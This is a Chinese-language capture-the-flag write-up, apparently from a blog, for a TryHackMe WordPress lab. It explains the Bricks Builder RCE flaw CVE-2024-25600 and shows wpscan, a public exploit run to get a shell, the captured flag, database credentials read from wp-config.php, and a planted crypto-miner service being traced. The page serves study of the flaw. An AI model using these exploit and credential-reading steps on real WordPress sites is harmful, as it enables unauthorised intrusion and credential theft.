import{_ as i}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as e,o as n}from"./app-fSrSTCoB.js";const l={};function t(h,s){return n(),a("div",null,s[0]||(s[0]=[e(`<h2 id="前言" tabindex="-1"><a class="header-anchor" href="#前言"><span>前言</span></a></h2><p>本题运用了wordpress漏洞<a href="https://medium.com/@chinamayjoshi/unauthenticated-remote-code-execution-rce-vulnerability-in-bricks-builder-for-wordpress-a12132c91cc1" target="_blank" rel="noopener noreferrer"><strong><em>CVE-2024-25600</em></strong></a><br> 我们可以提前配置wordscan，WPScan 是一款针对 WordPress 的安全扫描工具，用于检测插件、主题漏洞、用户枚举及配置问题。</p><h3 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理"><span>漏洞原理</span></a></h3><p>Bricks &lt;= 1.9.6版本，漏洞为远程代码执行 （RCE），<br> 漏洞存在于Bricks\\Query类中，Bricks\\Query 类用于管理 WordPress 帖子查询的渲染。<br> 在<code>Bricks\\Query</code> 类包含的方法<code>prepare_query_vars_from_settings</code>中第十行存在eval函数，会处理<code>$php_query_raw</code>参数</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$user_result</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> eval</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $php_query_raw</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// Execute the user code</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>接下来需要我们找到一种方法来传入<code>$php_query_raw</code>参数<br><img src="https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250503124903.png" alt="image.png" loading="lazy"><br> 发现在多处都实例化了<code>Bricks\\Query</code>类</p><p>在<code>Bricks\\Ajax::render_element($element)</code>处的实例化尤为显眼<br> Bricks 使用这个方法来显示编辑器内块/元素的预览。</p><p>实例代码：</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ( </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">!</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> empty</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $loop_element</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ) ) </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	{ </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$query</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> Query</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">( </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$loop_element</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// CUT FOR BREVITY </span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该方法可通过<code>admin-ajax.php</code> 端点和 <code>WordPress Rest API</code> 调用。</p><p>以上方方法调用的权限检测如下</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ( </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">bricks_is_ajax_call</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&amp;&amp;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> isset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $_POST</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ) ) {</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">    self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">::</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">verify_request</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">elseif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ( </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">bricks_is_rest_call</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() ) {</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // REST API (Permissions checked in the API-&gt;render_element_permissions_check())</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>bricks_is_ajax_call()</code>分支中会调用<code>Ajax::verify_request()</code>，检查当前用户是否有权访问 Bricks 构建器<br> 但是，如果此方法是通过 REST API 调用的，则不会调用<code>Ajax::verify_request()</code>。<br> 因为REST API会进行回调检查，<br> 关于<code>render_element</code>调用的路由表(注册路径)</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">// Server-side render (SSR) for builder elements via window.fetch API requests</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">		register_rest_route</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">			self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">::</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">API_NAMESPACE</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">			&#39;render_element&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">			[</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">				&#39;methods&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">             =&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;POST&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">				&#39;callback&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            =&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> $this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;render_element&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ],</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">				&#39;permission_callback&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> =&gt;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;"> $this</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;render_element_permissions_check&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ],</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">			]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		);</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>但在<code>render_element_permission_check</code>方法中没有执行任何权限检查，代码略<br> 该方法仅检查请求是否包含有效的<code>nonce</code>，<code>nonce</code>只能防止重放攻击，并不能进行权限检查</p><h2 id="解题过程" tabindex="-1"><a class="header-anchor" href="#解题过程"><span>解题过程</span></a></h2><p>先用wpscan 扫描一下目标服务器，</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wpscan</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> --url</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://bricks.thm/</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>发现存在bricks 且版本为1.9.5，刚好对应了此前的漏洞<br> 于是搜索漏洞会发现许多github项目的exploit，例如<br><a href="https://github.com/Chocapikk/CVE-2024-25600" target="_blank" rel="noopener noreferrer">Chocapikk/CVE-2024-25600：未经身份验证的远程代码执行 – Bricks &lt;= 1.9.6</a></p><p>现在，运行漏洞利用</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\Users\\l1709\\Desktop\\work\\CVE-2024-25600-main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">python</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exploit.py</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -u</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https://10.10.73.131</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[*] Nonce found: 4982bac29f</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[+] https://10.10.73.131 is vulnerable to CVE-2024-25600. Command output: apache</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">!</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">] Shell is ready, please type your commands UwU</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># ls</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">650c844110baced87e1606453b93f22a.txt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">index.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">kod</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">license.txt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">phpmyadmin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">readme.html</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-activate.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-admin</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-blog-header.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-comments-post.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-config-sample.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-config.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-content</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-cron.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-includes</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-links-opml.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-load.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-login.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-mail.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-settings.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-signup.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">wp-trackback.php</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">xmlrpc.php</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>获得隐藏的txt文件</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># cat 650c844110baced87e1606453b93f22a.txt</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">THM</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">{fl46_650c844110baced87e1606453b93f22a}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># cat wp-config.php | grep DB_</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_NAME&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;wordpress&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_USER&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;root&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_PASSWORD&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;lamp.sh&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_HOST&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;localhost&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_CHARSET&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;utf8mb4&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">define(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;DB_COLLATE&#39;,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> );</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>systemctl list-units --type=service --state=running</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>用于列出当前系统中 ​<strong>​所有正在运行的系统服务（Services）​</strong>​。这是 Systemd 服务管理器的核心命令，可帮助管理员监控系统状态。</p><p>可以发现可疑的服务</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ubuntu.service</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">                                 loaded</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> active</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> running</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> TRYHACK3M</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>继续输入</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">systemctl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cat</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ubuntu.service</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>查看 systemd 服务的完整配置文件内容​</strong>，自动定位服务配置文件的存储位置，无需手动搜索。</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># /etc/systemd/system/ubuntu.service</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[Unit]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Description</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">TRYHACK3M</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[Service]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">simple</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">ExecStart</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/lib/NetworkManager/nm-inet-dialog</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Restart</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">on-failure</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[Install]</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">WantedBy</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">multi-user.target</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可疑的服务名称为<br><code>nm-inet-dialog</code></p><p>来到可以的目录下</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span># dir /lib/NetworkManager</span></span>
<span class="line"><span>VPN             nm-dispatcher           nm-openvpn-service</span></span>
<span class="line"><span>conf.d          nm-iface-helper         nm-openvpn-service-openvpn-helper</span></span>
<span class="line"><span>dispatcher.d    nm-inet-dialog          nm-pptp-auth-dialog</span></span>
<span class="line"><span>inet.conf       nm-initrd-generator     nm-pptp-service</span></span>
<span class="line"><span>nm-dhcp-helper  nm-openvpn-auth-dialog  system-connections</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这个命令有点奇怪，四不像,但是不可以使用cd命令</p><p>经过搜索查看，最终发现inet.conf的文件十分可疑</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># cat  /lib/NetworkManager/inet.conf | less</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">ID:</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:04,743</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] confbak: Ready!</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:04,743</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] Status: Mining!</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:08,745</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:08,745</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] Bitcoin Miner Thread Started</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:08,745</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] Status: Mining!</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:10,747</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:12,748</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:14,751</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">2024-04-08</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> 10:46:16,753</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [*] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Miner</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
